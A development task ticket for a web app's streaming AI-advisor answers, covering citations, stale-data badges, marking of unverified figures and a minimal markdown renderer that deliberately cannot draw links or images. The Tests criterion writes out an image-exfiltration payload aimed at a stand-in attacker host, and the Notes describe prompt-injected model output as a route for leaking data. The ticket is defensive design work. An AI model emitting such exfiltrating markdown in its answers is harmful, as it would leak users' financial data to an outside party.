# 105 — Streaming answers: sources, staleness, unverified figures, and nothing that can load
Status: todo
Wave: 10   Lane: W
Touches: none
Blocked by: 104
Integrates with: 099
Read first: docs/ADVISOR.md#grounding, docs/ADVISOR.md#prompt-injection

## Goal
An answer appears as it is written, says where every figure came from and how current it is, marks
any figure it could not verify, and cannot be made to fetch anything — whatever text the model was
tricked into producing.

## Acceptance criteria
- [ ] `lib/advisor-stream.ts`: POSTs via `fetch` to a path built with `apiPath()`, parses SSE into
      `AdvisorEvent` typed from `api-types.ts`, and cancels through an `AbortController` — from a
      Stop button beside the answer, and on unmount.
- [ ] Text deltas append to the current answer without re-rendering earlier turns. A "checking
      figures" state holds until `answer`, which replaces the streamed text with the checked
      version; `regenerating` is shown as such.
- [ ] **Unverified figures are visibly marked** in place, with a one-line reason.
- [ ] Tool progress from `tool_call` events: a quiet line per lookup ("Spending by category, Q3").
- [ ] Sources under each answer, from its citations: what was looked up, as of when, which scope, a
      stale badge. Limitations listed plainly ("The app has no liability terms yet").
- [ ] `lib/markdown-lite.ts` renders paragraphs, emphasis, lists, tables and inline code, and
      **nothing else: no links, no images, no raw HTML.** URLs and `![…](…)` render as literal
      text. Screen tokens become in-app buttons through `lib/screens.ts`; unknown tokens render as
      text.
- [ ] Error events read plainly: cap reached (with its reset date), refused, timed out, cancelled.
- [ ] Tests (MSW streams): a full event sequence; an answer containing `![x](https://evil.example/?d=1)`
      and a raw `<img src=…>` produces **no `img` and no `a` element** in the DOM; Stop aborts the
      fetch; an unverified figure is marked; regeneration replaces the text; a stale citation shows
      its badge.

## Files
- `web/src/lib/advisor-stream.ts` (new)
- `web/src/lib/markdown-lite.ts` (new)
- `web/src/components/advisor/conversation.tsx` (new)
- `web/src/components/advisor/answer.tsx` (new)
- `web/src/components/advisor/answer.test.tsx`

## Notes
A small hand-written renderer, not a markdown library with its dangerous features switched off. A
library's defaults change between versions; a renderer that has no code path for `<a>` or `<img>`
cannot be configured into one. This is one of three layers against image exfiltration — the API
strips, this cannot draw, and 106's CSP would block.

The Stop button sits on the answer being generated, where the owner's eye already is.
